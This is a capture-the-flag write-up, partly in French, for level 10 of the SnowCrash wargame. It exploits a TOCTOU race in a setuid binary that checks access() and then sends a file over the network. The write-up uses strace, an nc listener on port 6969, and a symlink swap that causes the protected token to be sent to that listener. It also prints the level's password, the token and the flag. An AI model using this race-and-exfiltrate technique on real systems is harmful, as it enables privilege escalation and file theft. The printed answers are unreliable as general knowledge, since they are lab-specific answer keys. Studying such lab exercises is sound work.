# LEVEL 10

**LOGIN: level10**

**PASSWORD: s5cAJpM8ev6XHw998pRWG728z**

 ----
 
 ```
 level10@SnowCrash:~$ ls -l; echo; file level10 ; echo ; cat token
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token

level10: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf7e21fb68568fa57d6317d0535b97d9fca66f841, not stripped

cat: token: Permission denied
```
```
/level10 
./level10 file host
	sends file to host if you have access to it
```

Ok un peu de reseau !? 

`level10@SnowCrash:~$ touch file host`
```
level10@SnowCrash:~$ strace -s 1000 ./level10 file host
...
access("file", R_OK)                    = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "Connecting to host:6969 .. ", 27Connecting to host:6969 .. ) = 27
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(6969), sin_addr=inet_addr("255.255.255.255")}, 16) = -1 ENETUNREACH (Network is unreachable)
....
```

Le programme utilise `access` pour vérifier les droits au fichier passé en argument ... on imagine pouvoir utiliser un Exploiting Race Condition. 
Puis, il crée une connection sur l'ip passée en paramètre sur le port 6969

On ouvre donc une connection en attente sur ce port 
`nc -l -k -p 6969`

puis
`./level10 file 192.168.0.18 & ln -sf token file`

et on recoit bien le token.

**TOKEN: woupa2yuojeeaaed06riuj63c**

```
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```


